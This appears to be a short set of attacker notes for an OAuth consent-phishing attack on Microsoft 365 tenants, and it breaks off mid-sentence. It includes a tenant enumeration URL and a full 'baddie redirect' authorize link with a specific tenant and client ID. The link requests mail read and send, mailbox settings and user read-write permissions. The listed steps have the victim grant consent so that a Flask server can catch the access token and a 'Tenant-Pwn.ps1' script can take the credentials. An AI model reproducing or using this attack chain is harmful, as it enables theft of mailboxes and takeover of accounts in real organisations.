# How to enumerate any tenant easily courtesy of microsoft
https://login.microsoftonline.com/corpstrike.com/v2.0/.well-known/openid-configuration

# Run Flask Server
Start the server, dummy

# First baddie redirect
https://login.microsoftonline.com/838f6c73-507b-4674-b621-d8dd0009208d/oauth2/v2.0/authorize?client_id=84ace87e-3f92-47ad-89d3-08281190051b&response_type=token&redirect_uri=http://localhost:5000/callback&scope=https%3A%2F%2Fgraph.microsoft.com%2FMail.Read%20https%3A%2F%2Fgraph.microsoft.com%2FMail.Send%20https%3A%2F%2Fgraph.microsoft.com%2FMailboxSettings.ReadWrite%20https%3A%2F%2Fgraph.microsoft.com%2FUser.ReadWrite.All&response_mode=form_post&prompt=consent

1. User clicks above
2. Grants consent to Self
3. Flask catches access token
4. Tenant-Pwn.ps1 catches the credentials, sends the user an email to wait for app escalation and then